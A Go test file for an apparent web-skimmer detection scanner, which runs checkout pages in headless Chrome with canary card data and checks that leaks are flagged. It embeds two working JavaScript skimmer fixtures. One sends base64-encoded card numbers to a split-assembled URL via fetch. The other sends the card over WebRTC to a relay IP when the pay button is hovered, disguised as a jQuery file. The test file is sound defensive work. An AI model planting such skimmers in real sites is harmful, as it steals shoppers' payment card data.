package runtime

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/aviollaz/skimwatch/internal/domains"
	"github.com/aviollaz/skimwatch/internal/model"
)

func chromePath(t *testing.T) string {
	if p := os.Getenv("SKIMWATCH_CHROME"); p != "" {
		return p
	}
	for _, name := range []string{"google-chrome", "chromium", "chromium-browser", "chrome"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	t.Skip("no Chrome found; set SKIMWATCH_CHROME to run browser tests")
	return ""
}

// A checkout page whose card form is skimmed by a script that only reveals itself at
// runtime: the exfiltration URL is assembled from pieces, so static analysis alone sees no host.
const checkoutPage = `<!doctype html><html><body>
<form id="pay"><input name="cardnumber" autocomplete="cc-number"><input name="cvv" autocomplete="cc-csc">
<input type="email" name="email"><button>Pagar</button></form>
<script>
setTimeout(function(){
  var s = document.createElement("script");
  s.src = "/static/" + "loader.js";
  document.head.appendChild(s);
}, 50);
</script></body></html>`

const loaderJS = `(function(){
  var host = ["http:/", "/local", "host:", "EXFILPORT"].join("");
  document.querySelector('input[name="cardnumber"]').addEventListener("change", function(e){
    eval(atob("dmFyIHg9MTs="));
    var payload = btoa(e.target.value);
    fetch(host + "/c?d=" + payload, {mode: "no-cors"});
  });
})();`

func TestCanaryCatchesSkimmer(t *testing.T) {
	path := chromePath(t)

	var mu sync.Mutex
	var stolen []string
	exfil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		stolen = append(stolen, r.URL.String())
		mu.Unlock()
	}))
	defer exfil.Close()
	exfilPort := exfil.URL[strings.LastIndex(exfil.URL, ":")+1:]

	store := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/static/loader.js" {
			w.Header().Set("Content-Type", "application/javascript")
			io.WriteString(w, strings.Replace(loaderJS, "EXFILPORT", exfilPort, 1))
			return
		}
		w.Header().Set("Content-Type", "text/html")
		io.WriteString(w, checkoutPage)
	}))
	defer store.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()
	b, err := NewBrowser(ctx, BrowserOptions{ExecPath: path, UserAgent: "skimwatch-test", NoSandbox: true, NoProxy: true})
	if err != nil {
		t.Fatal(err)
	}
	defer b.Close()

	res, err := b.Visit(ctx, store.URL+"/checkout", 2*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	mu.Lock()
	fired := len(stolen)
	mu.Unlock()
	if fired == 0 {
		t.Fatalf("the fixture skimmer never fired; requests seen: %+v", res.Requests)
	}

	findings := Analyze(res, "test", domains.NewScope([]string{store.URL}, nil))
	var canary bool
	for _, f := range findings {
		if f.Rule == "canary-exfiltration" && f.Severity == model.Critical {
			canary = true
			if !strings.Contains(f.Location, "/static/loader.js") {
				t.Errorf("leak should be attributed to the loader script, got %q", f.Location)
			}
		}
	}
	if !canary {
		t.Fatalf("expected a critical canary leak, got %+v", findings)
	}

	if len(EvaluatedCode(res)) == 0 {
		t.Error("eval'd code should be captured")
	}
	var sawLoader bool
	for _, s := range res.Scripts {
		if strings.HasSuffix(s.URL, "/static/loader.js") && strings.Contains(s.Content, "cardnumber") {
			sawLoader = true
		}
	}
	if !sawLoader {
		t.Error("runtime-injected script body should be captured for static analysis")
	}
}

func TestLeakedCanaryEncodings(t *testing.T) {
	cases := map[string]string{
		"https://x.invalid/?c=" + CanaryCard:                      "card number",
		"https://x.invalid/?c=NDExMTExMTExMTExMTExMXw5MTc=":       "card number", // base64("4111111111111111|917")
		"https://x.invalid/?e=canary.skimwatch%40example.invalid": "email",
		"https://x.invalid/?q=skimwatchcanarytext":                "form text",
		"https://x.invalid/?q=hello":                              "",
	}
	for in, want := range cases {
		if got := leakedCanary(in); got != want {
			t.Errorf("%s: want %q, got %q", in, want, got)
		}
	}
}

// A PaperCut-style skimmer: it waits for the pointer to reach the pay button, then sends the
// card over a WebRTC data channel to a relay at a bare IP. No HTTP request ever carries the
// card, so only the WebRTC instrumentation and the hover can catch it. 198.51.100.7 is a
// documentation address (TEST-NET-2) that routes nowhere.
const webrtcCheckout = `<!doctype html><html><body>
<form id="pay"><input name="cardnumber" autocomplete="cc-number"><input name="cvv" autocomplete="cc-csc">
<button type="submit" id="go">Pagar</button></form>
<script src="/static/jQuery.1.3.1.js"></script></body></html>`

const webrtcSkimmer = `(function(){
  var armed = false;
  document.getElementById("go").addEventListener("mouseover", function(){
    if (armed) return; armed = true;
    var pc = new RTCPeerConnection({iceServers: [{urls: "turn:198.51.100.7:40000", username: "u", credential: "p"}]});
    var dc = pc.createDataChannel("x");
    var card = document.querySelector('input[name="cardnumber"]').value;
    try { dc.send(JSON.stringify({c: card})); } catch (e) {}
    window.__fired = true;
  });
})();`

func TestWebRTCSkimmerCaughtOnHover(t *testing.T) {
	path := chromePath(t)
	store := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, ".js") {
			w.Header().Set("Content-Type", "application/javascript")
			io.WriteString(w, webrtcSkimmer)
			return
		}
		w.Header().Set("Content-Type", "text/html")
		io.WriteString(w, webrtcCheckout)
	}))
	defer store.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()
	b, err := NewBrowser(ctx, BrowserOptions{ExecPath: path, UserAgent: "skimwatch-test", NoSandbox: true, NoProxy: true})
	if err != nil {
		t.Fatal(err)
	}
	defer b.Close()

	res, err := b.Visit(ctx, store.URL+"/checkout", 1500*time.Millisecond)
	if err != nil {
		t.Fatal(err)
	}
	if res.Hovered == 0 || res.CardFields == 0 {
		t.Fatalf("want the pay button hovered and card fields counted, got hovered=%d card=%d", res.Hovered, res.CardFields)
	}
	if len(res.WebRTCPeers) != 1 || res.WebRTCPeers[0] != "198.51.100.7" {
		t.Errorf("want the relay IP as a WebRTC peer, got %v", res.WebRTCPeers)
	}
	got := map[string]model.Finding{}
	for _, f := range Analyze(res, "test", domains.NewScope([]string{store.URL}, nil)) {
		got[f.Rule] = f
	}
	if f, ok := got["canary-webrtc"]; !ok || f.Severity != model.Critical {
		t.Fatalf("expected a critical WebRTC canary leak, got %+v", got)
	} else if !strings.Contains(f.Location, "jQuery.1.3.1.js") {
		t.Errorf("leak should be attributed to the fake jQuery, got %q", f.Location)
	}
	if got["webrtc-peer-external"].Severity != model.High {
		t.Errorf("unknown relay on a card page should be high, got %+v", got["webrtc-peer-external"])
	}
	for _, f := range got {
		if f.Rule == "api-replaced" && strings.Contains(f.Location, "RTC") {
			t.Error("the scanner's own WebRTC hooks must not be reported as page tampering")
		}
	}
}

func TestWebRTCPeers(t *testing.T) {
	events := []Event{
		{Kind: "webrtc-peer", Detail: `[{"urls":"stun:stun.l.google.com:19302"},{"urls":["turn:89.116.171.109:40000?transport=udp"]}]`},
		{Kind: "webrtc-remote", Detail: "v=0\r\nc=IN IP4 89.117.134.66\r\na=candidate:1 1 udp 2122260223 89.117.134.66 40000 typ host\r\n" +
			"a=candidate:2 1 udp 2122260223 abcd-1234.local 50000 typ host\r\na=candidate:3 1 udp 1 192.168.1.4 1 typ host"},
	}
	got := strings.Join(webrtcPeers(events), ",")
	if got != "stun.l.google.com,89.116.171.109,89.117.134.66" {
		t.Errorf("got %s", got)
	}
}
